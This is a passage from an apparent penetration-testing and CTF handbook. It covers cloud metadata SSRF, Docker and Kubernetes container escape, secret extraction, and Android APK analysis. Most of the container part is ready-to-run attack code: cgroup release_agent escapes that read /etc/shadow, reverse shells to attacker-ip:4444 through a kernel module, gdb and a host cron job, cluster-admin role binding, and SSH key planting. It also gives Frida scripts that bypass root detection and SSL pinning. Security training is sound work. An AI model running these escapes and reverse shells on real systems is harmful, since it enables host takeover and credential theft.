http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Alternative hostname
http://metadata/computeMetadata/v1/instance/service-accounts/default/token

# With required header in URL (if vulnerable parameter allows newlines)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%0AMetadata-Flavor:%20Google

# DNS alternatives
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal./computeMetadata/v1/instance/service-accounts/default/token
```

### Metadata Service Security Bypasses

**Header Injection Techniques**

```bash
# If application allows header injection via CRLF
# Inject Metadata-Flavor header for GCP
http://vulnerable-app.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%0d%0aMetadata-Flavor:%20Google

# Inject X-aws-ec2-metadata-token header for IMDSv2 (more complex)
# Requires two requests: token generation, then usage
```

**DNS Rebinding**

```bash
# Setup DNS record that alternates between:
# - Attacker's IP (for initial connection)
# - 169.254.169.254 (for metadata access)

# Tools:
# - Singularity: https://github.com/nccgroup/singularity
# - Rebinder: https://github.com/mogwaisec/rebinder

# Example domain that resolves to both IPs
example.com â†’ 1.2.3.4 (attacker)
example.com â†’ 169.254.169.254 (on second lookup)
```

**IPv6 Metadata Access** [Unverified] Some environments may expose metadata over IPv6 with different access controls.

```bash
# Try IPv6 equivalent
curl -g -6 "http://[fd00:ec2::254]/latest/meta-data/"  # AWS
curl -g -6 "http://[fe80::a9fe:a9fe]/metadata/instance?api-version=2021-02-01" -H "Metadata:true"  # Azure
```

---

## Container Misconfiguration Exploitation

Container misconfigurations enable privilege escalation, container escape, and access to host resources. This section covers Docker, Kubernetes, and general container security issues.

### Docker Enumeration

**Determine Container Environment**

```bash
# Check if running in container
ls -la /.dockerenv  # Docker-specific file
cat /proc/1/cgroup | grep docker
cat /proc/self/cgroup | grep -E 'docker|kube|lxc'

# Check for container runtime
if [ -f /.dockerenv ]; then
    echo "Running in Docker container"
fi

# Alternative indicators
# - Hostname is random hex string
# - Limited number of processes
# - Unusual network configuration
hostname
ps aux | wc -l
ip addr show
```

**Docker Socket Exploitation**

```bash
# Check for Docker socket mount (CRITICAL misconfiguration)
ls -la /var/run/docker.sock

# If socket is accessible, you have root-equivalent access
# List containers
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# Create privileged container that mounts host filesystem
curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}],"HostConfig":{"Privileged":true}}' \
  http://localhost/containers/create

# Start container
curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/<container-id>/start

# Attach to container
docker -H unix:///var/run/docker.sock exec -it <container-id> /bin/sh

# Access host filesystem
chroot /host /bin/bash
```

**Privileged Container Escape**

```bash
# Check if container is privileged
capsh --print | grep cap_sys_admin
cat /proc/self/status | grep CapEff

# If privileged, can access host devices
ls -la /dev

# Method 1: Mount host filesystem
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output

# Method 2: Access host via /dev/sda
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# Method 3: Exploit cgroup notify_on_release
# (Felix Wilhelm's technique)
```

**Capability-Based Escape**

```bash
#!/bin/bash

# Check capabilities
capsh --print
cat /proc/self/status | grep Cap

# Dangerous capabilities:
# - CAP_SYS_ADMIN: Can mount filesystems, load kernel modules
# - CAP_SYS_PTRACE: Can trace/inject into processes
# - CAP_SYS_MODULE: Can load kernel modules
# - CAP_DAC_READ_SEARCH: Can bypass file read permissions
# - CAP_DAC_OVERRIDE: Can bypass file permissions
# - CAP_SYS_RAWIO: Can access I/O ports directly

# CAP_SYS_ADMIN escape via cgroup release_agent
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
echo "#!/bin/sh
$1 > $t/o" > /c
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o

# CAP_SYS_PTRACE escape (inject into host process)
# Requires access to host PID namespace
ps aux  # If you see host processes
# gdb -p 1  # Attach to init
# call system("bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'")

# CAP_SYS_MODULE escape (load malicious kernel module)
# Create reverse shell kernel module
cat > reverse_shell.c << 'EOF'
#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attacker");
MODULE_DESCRIPTION("Reverse Shell Module");

int init_module(void) {
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };
    
    char *argv[] = {
        "/bin/bash",
        "-c",
        "bash -i >& /dev/tcp/attacker-ip/4444 0>&1",
        NULL
    };
    
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

void cleanup_module(void) {
}
EOF

# Compile and load (requires kernel headers)
# This is typically not practical in containers but demonstrates the risk
````

**Exposed Docker API Exploitation**
```bash
# Check if Docker API is exposed on network
curl http://target-ip:2375/version
curl http://target-ip:2376/version  # TLS

# If accessible, create privileged container
curl -X POST -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host && bash"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://target-ip:2375/containers/create

# Get container ID from response
CONTAINER_ID="<returned-id>"

# Start container
curl -X POST http://target-ip:2375/containers/$CONTAINER_ID/start

# Execute command
curl -X POST -H "Content-Type: application/json" \
  -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/host/etc/shadow"]}' \
  http://target-ip:2375/containers/$CONTAINER_ID/exec

# Or use Docker client directly
docker -H tcp://target-ip:2375 ps
docker -H tcp://target-ip:2375 run -v /:/host -it alpine chroot /host bash
````

### Docker Security Tools

**Docker Bench Security**

```bash
# Clone repository
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security

# Run security audit
sudo sh docker-bench-security.sh

# Output includes checks for:
# - Host configuration
# - Docker daemon configuration
# - Docker daemon files
# - Container images and build files
# - Container runtime
# - Docker security operations
# - Docker Swarm configuration (if applicable)
```

**Trivy** - Container vulnerability scanner

```bash
# Install
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
apt update && apt install trivy

# Scan Docker image
trivy image alpine:latest

# Scan with severity filter
trivy image --severity HIGH,CRITICAL nginx:latest

# Scan filesystem
trivy fs /path/to/project

# Scan container
trivy image $(docker ps --format '{{.Image}}' | head -1)

# Output as JSON
trivy image --format json -o results.json alpine:latest
```

**Grype** - Vulnerability scanner

```bash
# Install
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Scan image
grype alpine:latest

# Scan directory
grype dir:/path/to/directory

# Scan SBOM
grype sbom:./sbom.json

# Filter by severity
grype alpine:latest --fail-on high
```

### Kubernetes Enumeration

**Determine Kubernetes Environment**

```bash
# Check for Kubernetes service account
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# Contents:
# - ca.crt: Kubernetes CA certificate
# - namespace: Current namespace
# - token: Service account JWT token

# Get namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Get token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check environment variables
env | grep -i kube
# Look for:
# - KUBERNETES_SERVICE_HOST
# - KUBERNETES_SERVICE_PORT
# - KUBERNETES_PORT
```

**Kubernetes API Enumeration**

```bash
# Set up variables
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
TOKEN=$(cat ${SERVICEACCOUNT}/token)
CACERT=${SERVICEACCOUNT}/ca.crt

# Test API access
curl --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api

# Get API versions
curl --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/apis

# List pods in namespace
curl --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces/${NAMESPACE}/pods

# List pods in all namespaces (if permitted)
curl --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/pods

# List secrets (high value target)
curl --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets

# Get specific secret
curl --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets/<secret-name>

# List services
curl --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces/${NAMESPACE}/services

# List nodes (usually requires elevated permissions)
curl --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/nodes
```

**kubectl from Inside Container**

```bash
# Install kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl

# Configure kubectl to use service account
./kubectl --server=${APISERVER} \
  --certificate-authority=${CACERT} \
  --token=${TOKEN} \
  get pods

# Create kubeconfig
cat > /tmp/kubeconfig << EOF
apiVersion: v1
kind: Config
clusters:
- cluster:
    certificate-authority: ${CACERT}
    server: ${APISERVER}
  name: local
contexts:
- context:
    cluster: local
    namespace: ${NAMESPACE}
    user: serviceaccount
  name: local-context
current-context: local-context
users:
- name: serviceaccount
  user:
    token: ${TOKEN}
EOF

# Use kubeconfig
export KUBECONFIG=/tmp/kubeconfig
./kubectl get pods
./kubectl get secrets
./kubectl get sa  # Service accounts
```

**Service Account Permission Testing**

```bash
# Check what you can do with current service account
./kubectl auth can-i --list

# Test specific actions
./kubectl auth can-i create pods
./kubectl auth can-i get secrets
./kubectl auth can-i create pods --all-namespaces
./kubectl auth can-i get nodes
./kubectl auth can-i create clusterrolebindings

# Check permissions for specific resource
./kubectl auth can-i '*' '*'  # Check for cluster-admin
```

### Kubernetes Privilege Escalation

**Overly Permissive RBAC**

```bash
# If you can create pods, create privileged pod
cat > privpod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: privpod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: privcontainer
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
EOF

./kubectl apply -f privpod.yaml
./kubectl exec -it privpod -- /bin/sh
# Now in privileged pod with host access
chroot /host /bin/bash
```

**Create Service Account with Elevated Permissions**

```bash
# If you can create service accounts and role bindings
cat > admin-sa.yaml << 'EOF'
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-sa
  namespace: default
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-sa-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-sa
  namespace: default
EOF

./kubectl apply -f admin-sa.yaml

# Get token for new service account
SECRET_NAME=$(./kubectl get sa admin-sa -o jsonpath='{.secrets[0].name}')
NEW_TOKEN=$(./kubectl get secret $SECRET_NAME -o jsonpath='{.data.token}' | base64 -d)

# Use new token
curl --cacert ${CACERT} -H "Authorization: Bearer ${NEW_TOKEN}" ${APISERVER}/api/v1/nodes
```

**Exploit Writable hostPath Volumes**

```bash
# If pod mounts writable host directory
# Check mounted volumes
mount | grep -i host
df -h

# Common writable paths:
# - /var/log
# - /var/lib/kubelet
# - /etc/kubernetes

# Write cron job to host
echo '* * * * * root bash -c "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"' > /host-mount/etc/cron.d/reverse-shell

# Or write SSH key
mkdir -p /host-mount/root/.ssh
echo "ssh-rsa AAAA..." > /host-mount/root/.ssh/authorized_keys
chmod 600 /host-mount/root/.ssh/authorized_keys
```

**Escape via hostPID/hostNetwork**

```bash
# If hostPID is enabled, can interact with host processes
ps aux  # Should see all host processes

# Kill/modify host processes
kill -9 <host-pid>

# If hostNetwork is enabled, can sniff network traffic
tcpdump -i eth0 -w /tmp/capture.pcap

# Access host services bound to localhost
curl http://127.0.0.1:10250/pods  # Kubelet API
```

### Kubernetes Security Tools

**kube-hunter** - Kubernetes penetration testing

```bash
# Install
pip3 install kube-hunter

# Run from outside cluster (network scan)
kube-hunter --remote <cluster-ip>

# Run from inside pod
kube-hunter --pod

# Run with custom CIDR
kube-hunter --cidr 10.0.0.0/8

# Output to JSON
kube-hunter --remote <cluster-ip> --report json
```

**kubeletctl** - Kubelet exploitation tool

```bash
# Install
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64
mv kubeletctl_linux_amd64 kubeletctl

# Scan for kubelet
./kubeletctl scan --cidr 10.0.0.0/24

# Get pods from kubelet
./kubeletctl -s <kubelet-ip> pods

# Get token from pod
./kubeletctl -s <kubelet-ip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod-name> -c <container-name>

# Run command
./kubeletctl -s <kubelet-ip> exec "id" -p <pod-name> -c <container-name>

# Check for anonymous auth
./kubeletctl -s <kubelet-ip> --anonymous pods
```

**Peirates** - Kubernetes penetration testing framework

```bash
# Download
wget https://github.com/inguardians/peirates/releases/download/v1.1.14/peirates-linux-amd64.tar.xz
tar -xf peirates-linux-amd64.tar.xz

# Run (interactive menu)
./peirates

# Features:
# - Service account enumeration
# - Secret extraction
# - RBAC analysis
# - Privilege escalation
# - Lateral movement
# - Persistence
```

**kubeaudit** - Kubernetes security auditing

```bash
# Install
wget https://github.com/Shopify/kubeaudit/releases/download/v0.22.0/kubeaudit_0.22.0_linux_amd64.tar.gz
tar -xf kubeaudit_0.22.0_linux_amd64.tar.gz

# Audit all resources
./kubeaudit all

# Audit specific namespace
./kubeaudit all -n namespace-name

# Audit specific resource type
./kubeaudit privileged
./kubeaudit hostns  # Host namespace usage
./kubeaudit caps    # Capabilities

# Output as JSON
./kubeaudit all -f json > audit.json
```

**kube-bench** - CIS Kubernetes benchmark

```bash
# Install
curl -L https://github.com/aquasecurity/kube-bench/releases/download/v0.6.15/kube-bench_0.6.15_linux_amd64.tar.gz -o kube-bench.tar.gz
tar -xvf kube-bench.tar.gz

# Run on master node
./kube-bench master

# Run on worker node
./kube-bench node

# Run specific version
./kube-bench --version 1.23

# Output as JSON
./kube-bench --json > results.json
```

### Container Secrets Extraction

**Environment Variables**

```bash
# Dump all environment variables
env
printenv

# Search for secrets in environment
env | grep -iE "pass|key|token|secret|credential"

# Check process environment for other containers (if hostPID)
for pid in /proc/[0-9]*; do
    echo "=== $pid ==="
    cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|key|token"
done
```

**Kubernetes Secrets**

```bash
# Secrets are mounted as files or environment variables

# Check mounted secrets
ls -la /var/run/secrets/
find / -name "*secret*" 2>/dev/null

# Common secret locations:
# - /var/run/secrets/kubernetes.io/serviceaccount/
# - /etc/secrets/
# - Application-specific paths

# Extract via API
./kubectl get secrets
./kubectl get secret <secret-name> -o json | jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'
```

**Container Registry Credentials**

```bash
# Docker config may contain registry credentials
cat ~/.docker/config.json
cat /root/.docker/config.json
cat /home/*/.docker/config.json

# Kubernetes image pull secrets
./kubectl get secrets --field-selector type=kubernetes.io/dockerconfigjson
./kubectl get secret <secret-name> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d

# Decode credentials
echo '<base64-auth>' | base64 -d
# Format: username:password
```

**Application Secrets**

```bash
# Configuration files
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -iE "password|key|token" 2>/dev/null

# Database connection strings
find / -name "*.properties" -o -name "application.yml" -o -name "web.config" 2>/dev/null | xargs grep -iE "connection|jdbc|mongodb" 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null

# AWS credentials
cat ~/.aws/credentials
cat ~/.aws/config

# Azure credentials
cat ~/.azure/credentials

# GCP credentials
cat ~/.config/gcloud/credentials.db
find / -name "*service-account*.json" 2>/dev/null
```

### Container Network Exploitation

**Network Scanning from Container**

```bash
# Install nmap if needed
apt update && apt install -y nmap

# Scan pod network
nmap -sn 10.244.0.0/16  # Typical pod CIDR

# Scan service network
nmap -sn 10.96.0.0/12  # Typical service CIDR

# Scan host network (if hostNetwork enabled)
nmap -sn 192.168.1.0/24

# Identify Kubernetes services
nmap -p 443,6443,8443,10250,10251,10252 10.96.0.1

# Kubelet API (typically port 10250)
curl -k https://node-ip:10250/pods
```

**Service Discovery**

```bash
# DNS enumeration
nslookup kubernetes.default
nslookup kubernetes.default.svc.cluster.local

# Enumerate services via DNS
for i in {1..254}; do
    host 10-96-0-$i.default.pod.cluster.local 2>/dev/null
done

# Check CoreDNS
dig @10.96.0.10 kubernetes.default.svc.cluster.local

# Environment variable service discovery
env | grep -i service | grep -i host
```

**Network Policy Bypass** [Inference] If network policies are misconfigured or not enforced, lateral movement between pods is possible.

```bash
# Check if egress is restricted
curl https://www.google.com
ping 8.8.8.8

# Try accessing other namespaces
curl http://service.other-namespace.svc.cluster.local

# Access metadata service (if not blocked)
curl http://169.254.169.254/latest/meta-data/
```

### Comprehensive Container Escape Script

```bash
#!/bin/bash

echo "[*] Container Security Assessment"
echo "=================================="

# Check environment
echo -e "\n[+] Environment Detection"
if [ -f /.dockerenv ]; then
    echo "  - Running in Docker container"
fi

if [ -d /var/run/secrets/kubernetes.io ]; then
    echo "  - Running in Kubernetes pod"
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
    echo "  - Namespace: $NAMESPACE"
fi

# Check privileges
echo -e "\n[+] Privilege Assessment"
if [ "$(id -u)" -eq 0 ]; then
    echo "  - Running as root"
fi

capsh --print 2>/dev/null | grep "Current:" && echo "  - Capabilities detected"

# Check for Docker socket
echo -e "\n[+] Docker Socket Check"
if [ -S /var/run/docker.sock ]; then
    echo "  - [CRITICAL] Docker socket exposed!"
    ls -la /var/run/docker.sock
fi

# Check for privileged
echo -e "\n[+] Privileged Container Check"
if grep -q "docker\|lxc" /proc/1/cgroup && [ "$(capsh --print | grep -c cap_sys_admin)" -gt 0 ]; then
    echo "  - [CRITICAL] Container appears privileged"
fi

# Check host mounts
echo -e "\n[+] Host Filesystem Mounts"
mount | grep -E "\/host|\/dev|\/proc" | grep -v "\/proc/sys"

# Check for secrets
echo -e "\n[+] Secrets Detection"
find / -name "*secret*" -o -name "*password*" -o -name "*.pem" 2>/dev/null | head -20

# Kubernetes enumeration
if [ -d /var/run/secrets/kubernetes.io ]; then
    echo -e "\n[+] Kubernetes Service Account"
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    if [ -n "$TOKEN" ]; then
        echo "  - Service account token found"
        echo "  - Token (first 50 chars): ${TOKEN:0:50}..."
    fi
fi

# Network configuration
echo -e "\n[+] Network Configuration"
ip addr show 2>/dev/null || ifconfig
echo "  - Default gateway:"
ip route | grep default 2>/dev/null || route -n | grep UG

# Environment variables
echo -e "\n[+] Interesting Environment Variables"
env | grep -iE "pass|key|token|secret|credential|kube|docker|aws|azure|gcp" | head -20

echo -e "\n[*] Assessment Complete"
```

**Important Notes:**

[Inference] Container escape success rates depend heavily on specific misconfigurations. Not all techniques work in all environments.

[Unverified] Kernel exploits for container escape exist but are not covered here as they vary significantly by kernel version and may cause system instability.

**Related Topics**: Kubernetes network policies, Pod Security Standards (PSS), Pod Security Admission (PSA), AppArmor/SELinux profiles, seccomp profiles, runtime security monitoring (Falco)

---

# Mobile & IoT Assessment

Mobile and IoT security assessment involves analyzing application security, reverse engineering mobile binaries, examining device configurations, and identifying vulnerabilities in resource-constrained environments. CTF challenges often feature APK analysis, iOS binary inspection, and mobile-specific exploitation scenarios.

## Android Application Analysis

Android applications (APK files) are ZIP archives containing compiled code (DEX), resources, manifest files, and native libraries. Analysis involves static examination, dynamic testing, and runtime manipulation.

### APK Structure and Components

**APK Contents**:

- `AndroidManifest.xml` - App permissions, components, configuration
- `classes.dex` - Dalvik bytecode (compiled Java/Kotlin)
- `resources.arsc` - Compiled resources
- `res/` - Application resources (layouts, images, strings)
- `lib/` - Native libraries (.so files for ARM/x86)
- `assets/` - Raw asset files
- `META-INF/` - Signing certificates and signatures

### APK Acquisition and Extraction

**Extract APK from Device**:

```bash
# List installed packages
adb shell pm list packages

# Find package path
adb shell pm path com.example.app

# Pull APK from device
adb pull /data/app/com.example.app-1/base.apk

# Alternative: using package name
adb shell pm path com.example.app | cut -d':' -f2 | xargs -I {} adb pull {}
```

**Extract APK Contents**:

```bash
# APK is a ZIP archive
unzip application.apk -d extracted_apk/

# Using apktool (decodes resources and manifest)
apktool d application.apk -o decoded_apk/

# Force overwrite existing directory
apktool d -f application.apk
```

### Static Analysis Tools

**apktool - Resource and Manifest Decoding**:

```bash
# Decode APK
apktool d application.apk

# Rebuild APK (after modifications)
apktool b decoded_apk/ -o rebuilt.apk

# Install framework resources (for system apps)
apktool if framework-res.apk
```

**dex2jar - Convert DEX to JAR**:

```bash
# Convert DEX to JAR
d2j-dex2jar application.apk

# Output: application-dex2jar.jar

# Convert specific DEX file
d2j-dex2jar classes.dex
```

**jd-gui - Java Decompiler GUI**:

```bash
# Launch GUI
jd-gui application-dex2jar.jar

# Command-line decompilation
jd-cli application-dex2jar.jar -od decompiled_source/
```

**jadx - Direct APK Decompiler**:

```bash
# GUI mode
jadx-gui application.apk

# Command-line decompilation
jadx application.apk -d decompiled_output/

# Decompile with resources
jadx -r application.apk -d output/

# Export as Gradle project
jadx --export-gradle application.apk -d gradle_project/
```

**JADX Features**:

- Direct APK/DEX/JAR decompilation
- Resource viewing
- Full-text search across code
- Cross-references and usage tracking
- Better decompilation accuracy than dex2jar+jd-gui [Inference based on community feedback]

### Manifest Analysis

**AndroidManifest.xml Examination**:

```bash
# Decode manifest (apktool automatically decodes)
apktool d application.apk

# View manifest
cat decoded_apk/AndroidManifest.xml

# Extract specific information
grep -E 'uses-permission|activity|service|receiver' decoded_apk/AndroidManifest.xml
```

**Key Manifest Elements**:

**Permissions**:

```xml
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
```

**Exported Components** (vulnerable if not properly protected):

```xml
<activity android:name=".VulnerableActivity" android:exported="true"/>
<service android:name=".ExposedService" android:exported="true"/>
<receiver android:name=".OpenReceiver" android:exported="true"/>
```

**Debuggable Flag** (security risk in production):

```xml
<application android:debuggable="true">
```

**Backup Settings**:

```xml
<application android:allowBackup="true">
<!-- Allows adb backup, potential data exposure -->
```

### String and Resource Extraction

**Extract Strings**:

```bash
# Binary strings from DEX
strings classes.dex | grep -i "password\|secret\|key\|api"

# From native libraries
strings lib/arm64-v8a/libnative.so

# Using apktool decoded resources
cat decoded_apk/res/values/strings.xml
```

**Resource Analysis**:

```bash
# Search for hardcoded credentials
grep -r "password" decoded_apk/res/
grep -r "api_key" decoded_apk/res/

# Examine shared preferences (if extracted from device)
adb shell "run-as com.example.app cat /data/data/com.example.app/shared_prefs/prefs.xml"
```

### Code Analysis Techniques

**Search for Vulnerabilities**:

```bash
# Search decompiled code for security issues
grep -r "WebView" decompiled_output/
grep -r "addJavascriptInterface" decompiled_output/
grep -r "setAllowFileAccess" decompiled_output/
grep -r "MODE_WORLD_READABLE\|MODE_WORLD_WRITABLE" decompiled_output/
grep -r "TrustAllManager\|X509TrustManager" decompiled_output/
grep -r "HostnameVerifier" decompiled_output/
```

**Common Vulnerabilities to Identify**:

1. **Insecure Data Storage**:

```java
// Hardcoded credentials
String password = "admin123";
String apiKey = "sk_live_abc123xyz789";

// World-readable files
openFileOutput("data.txt", MODE_WORLD_READABLE);
```

2. **Insecure Communication**:

```java
// Disabled certificate validation
TrustManager[] trustAllCerts = new TrustManager[]{
    new X509TrustManager() {
        public void checkClientTrusted(X509Certificate[] chain, String authType) {}
        public void checkServerTrusted(X509Certificate[] chain, String authType) {}
        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
    }
};
```

3. **WebView Vulnerabilities**:

```java
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JavaScriptInterface(), "Android");
webView.getSettings().setAllowFileAccess(true);
```

4. **Exported Components**:

```java
// Unprotected activity/service/receiver accessible via ADB
adb shell am start -n com.example.app/.VulnerableActivity
```

### Dynamic Analysis Setup

**Android Emulator (Android Studio AVD)**:

```bash
# List available AVDs
emulator -list-avds

# Start emulator
emulator -avd Pixel_5_API_30

# Start with writable system
emulator -avd Pixel_5_API_30 -writable-system
```

**Genymotion** - Performance-optimized emulator:

```bash
# Better performance than AVD for analysis
# Supports root access and ARM translation
```

**Real Device Setup**:

```bash
# Enable USB debugging on device
# Settings â†’ Developer Options â†’ USB Debugging

# Verify connection
adb devices

# Root device (requires unlocked bootloader)
# Methods vary by device - Magisk commonly used
```

### Installing and Running APKs

```bash
# Install APK
adb install application.apk

# Install with version downgrade
adb install -r -d application.apk

# Uninstall application
adb uninstall com.example.app

# Launch application
adb shell am start -n com.example.app/.MainActivity

# Launch with intent data
adb shell am start -n com.example.app/.MainActivity -d "content://data"
```

### Runtime Analysis with Frida

**Frida Installation**:

```bash
# Install Frida on host
pip3 install frida-tools

# Download and push Frida server to device
adb push frida-server-16.0.19-android-arm64 /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# Verify Frida
frida-ps -U  # List processes on USB device
```

**Basic Frida Hooking**:

```javascript
// hook_script.js - Hook method to log arguments
Java.perform(function() {
    var MainActivity = Java.use("com.example.app.MainActivity");
    
    MainActivity.checkPassword.implementation = function(password) {
        console.log("Password checked: " + password);
        return this.checkPassword(password);
    };
});
```

```bash
# Run Frida script
frida -U -f com.example.app -l hook_script.js --no-pause
```

**Advanced Frida Techniques**:

**Bypass Root Detection**:

```javascript
Java.perform(function() {
    var RootCheck = Java.use("com.example.app.RootDetection");
    
    RootCheck.isRooted.implementation = function() {
        console.log("Root check bypassed");
        return false;
    };
});
```

**SSL Pinning Bypass**:

```javascript
Java.perform(function() {
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    
    var TrustManager = Java.registerClass({
        name: "com.example.TrustManager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var TrustManagers = [TrustManager.$new()];
    var SSLContext_init = SSLContext.init.overload(
        "[Ljavax.net.ssl.KeyManager;",
        "[Ljavax.net.ssl.TrustManager;",
        "java.security.SecureRandom"
    );
    
    SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
        SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
    };
});
```

**Hook Native Functions**:

```javascript
// Hook native library function
Interceptor.attach(Module.findExportByName("libnative.so", "Java_com_example_app_Native_checkLicense"), {
    onEnter: function(args) {
        console.log("checkLicense called");
        console.log("Argument: " + Memory.readUtf8String(args[2]));
    },
    onLeave: function(retval) {
        console.log("Original return: " + retval);
        retval.replace(1);  // Force return true
    }
});
```

### objection - Frida-Powered Toolkit

```bash
# Install objection
pip3 install objection

# Launch with app
objection -g com.example.app explore

# Common objection commands
android hooking list activities
android hooking list services
android hooking watch class com.example.app.MainActivity
android sslpinning disable
android root disable
memory dump all output.dmp
```

### Network Traffic Analysis

**Burp Suite Configuration**:

```bash
# Install Burp CA certificate on device
adb push burp-cert.der /sdcard/
# Settings â†’ Security â†’ Install from storage

# Configure proxy
adb shell settings put global http_proxy <burp_ip>:8080

# Remove proxy
adb shell settings put global http_proxy :0
```

**Packet Capture**:

```bash
# Capture traffic on device
adb shell tcpdump -i any -w /sdcard/capture.pcap

# Pull capture file
adb pull /sdcard/capture.pcap

# Analyze with Wireshark
wireshark capture.pcap
```

### APK Modification and Repackaging

**Inject Code**:

```bash
# Decompile APK
apktool d application.apk

# Modify smali code or resources
nano decoded_apk/smali/com/example/app/MainActivity.smali

# Rebuild APK
apktool b decoded_apk/ -o modified.apk

# Sign APK (required for installation)
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore my-release-key.keystore modified.apk alias_name

# Verify signature
jarsigner -verify -verbose -certs modified.apk

# Alternative: zipalign for optimization
zipalign -v 4 modified.apk aligned.apk
```

